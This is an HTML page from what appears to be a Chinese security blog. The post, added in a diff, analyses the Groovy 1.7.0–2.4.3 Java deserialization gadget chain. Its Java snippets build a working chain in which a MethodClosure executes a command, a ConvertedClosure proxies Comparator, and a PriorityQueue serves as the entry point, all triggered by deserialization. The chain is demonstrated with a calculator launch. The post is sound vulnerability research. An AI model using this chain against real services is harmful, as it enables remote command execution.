@@ -1,0 +1,233 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【快速笔记】Groovy链 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【快速笔记】Groovy链 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="影响版本：Groovy 1.7.0-2.4.3
+Marven
+  &lt;dependency&gt;
+      &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;
+      &lt;a..." />
+    <meta name="keywords" content="漏洞分析,Java反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【快速笔记】Groovy链
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-11-01
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/XzhG4n-u0/" class="post-tag">
+                  # 漏洞分析
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
+                  # Java反序列化
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/kuai-su-bi-ji-groovy-lian.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p><strong>影响版本：Groovy 1.7.0-2.4.3</strong></p>
+<p><strong>Marven</strong></p>
+<pre><code class="language-xml">  &lt;dependency&gt;
+      &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;
+      &lt;artifactId&gt;groovy-all&lt;/artifactId&gt;
+      &lt;version&gt;2.4.3&lt;/version&gt;
+  &lt;/dependency&gt;
+</code></pre>
+<p>ysoserial的利用链<br>
+<img src="https://skyblu3519.github.io/post-images/1698853963282.png" alt="" loading="lazy"></p>
+<p>危险函数：org.codehaus.groovy.runtime.MethodClosure#call</p>
+<p>利用方式：</p>
+<pre><code class="language-java">String cmd = &quot;open -a Calculator&quot;;
+
+MethodClosure methodClosure = new MethodClosure(cmd, &quot;execute&quot;);
+methodClosure.call();
+</code></pre>
+<p>这个调用是真的看晕了，看了下前辈们的分析，最后也没搞懂到底是个怎么回事。大致是下面这个流程？</p>
+<p>经过一次递归<br>
+<img src="https://skyblu3519.github.io/post-images/1698853977345.png" alt="" loading="lazy"></p>
+<p>到了这步<br>
+<img src="https://skyblu3519.github.io/post-images/1698854005129.png" alt="" loading="lazy"></p>
+<p>直接有个Runtime的调用<br>
+<img src="https://skyblu3519.github.io/post-images/1698854013281.png" alt="" loading="lazy"></p>
+<p>这里涉及一个groovy的核心思想，就贴来感受下好了。参考：<a href="https://cn-sec.com/archives/388569.html">https://cn-sec.com/archives/388569.html</a></p>
+<blockquote>
+<p>DGM全称是DefaultGroovyMethods，DGM类中包含了Groovy为JDK的类添加的各种方法。DGM调用优化的思想就是通过直接调用来代替反射调用。而要实现直接调用，则需要为DGM中的每个方法生成一个从MetaMethod派生的包装类，该类的invoke方法将直接调用DGM中对应的方法。<br>
+......<br>
+可以看到，方法名对应特定的对象，每个人的机器生成的顺序可能都不太一样，这也就能解释为什么之前使用execute方法名，从table中获取到的方法名也为execute了，以及其所关联的对象中的方法也为execute。</p>
+</blockquote>
+<p>ConvertedClosure可以理解为动态代理一个类的一个方法，这个方法一开始可以传入。一旦调用了这个代理的方法，就会走到<code>org.codehaus.groovy.runtime.MethodClosure#call</code></p>
+<p>ConvertedClosure的父类ConversionHandler实现了invoke方法，也就是可以做一个动态代理的handler<br>
+<img src="https://skyblu3519.github.io/post-images/1698854038563.png" alt="" loading="lazy"></p>
+<p>invokeCustom在ConvertedClosure实现<br>
+<img src="https://skyblu3519.github.io/post-images/1698854044083.png" alt="" loading="lazy"></p>
+<p>这就是上面<code>methodClosure.call();</code>的形式，可以让ConvertedClosure代理一个Comparator接口的compare方法</p>
+<pre><code class="language-java">final ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure,&quot;compare&quot;);
+Comparator m = (Comparator) Proxy.newProxyInstance(
+    methodClosure.getClass().getClassLoader(),
+    new Class[]{Comparator.class},
+    convertedClosure
+);
+m.compare(null, null);		// 随便传入什么参数都会调用methodClosure.call()
+</code></pre>
+<p>入口可以选CC2/4的priorityQueue。</p>
+<pre><code class="language-java">PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(m);
+Class pc = priorityQueue.getClass();
+Field sizeField = pc.getDeclaredField(&quot;size&quot;);
+sizeField.setAccessible(true);
+sizeField.set(priorityQueue, 2);
+
+String s = serializeToBase64(priorityQueue);
+deserializeFromBase64(s);
+</code></pre>
+<p>当代理Map的entrySet方法的时候，就可以用CC1来触发。</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/jackson-lian-de-bu-wen-ding-wen-ti/">
+              <h3 class="post-title">
+                Jackson链的不稳定问题
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
